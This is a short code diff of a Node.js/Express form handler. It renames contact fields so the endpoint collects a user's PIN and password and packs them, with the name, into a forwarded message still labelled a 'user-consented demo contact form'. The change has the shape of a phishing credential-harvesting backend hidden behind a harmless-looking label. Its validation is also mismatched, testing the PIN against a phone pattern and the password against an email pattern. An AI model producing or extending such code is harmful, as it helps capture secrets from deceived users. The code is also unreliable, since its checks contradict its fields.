@@ -13,8 +13,8 @@ app.post("/api/submit", async (req, res) => {
 
   const clean = (v, max) => typeof v === "string" ? v.trim().slice(0, max) : "";
   const safeName = clean(name, 10);
-  const safeMobile = clean(pin, 6);
-  const safeEmail = clean(password, 12);
+  const safePin = clean(pin, 6);
+  const safePassword = clean(password, 12);
 
   if (!safeName || !/^[0-9+\-\s]{8,20}$/.test(safePin) ||
       !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(safePassword)) {
@@ -27,8 +27,8 @@ app.post("/api/submit", async (req, res) => {
     const message = [
       "New demo form submission",
       `Name: ${safeName}`,
-      `Mobile: ${safePin}`,
-      `Email: ${safePassword}`,
+      `Pin: ${safePin}`,
+      `Password: ${safePassword}`,
       "Purpose: User-consented demo contact form"
     ].join("\n");
     try {
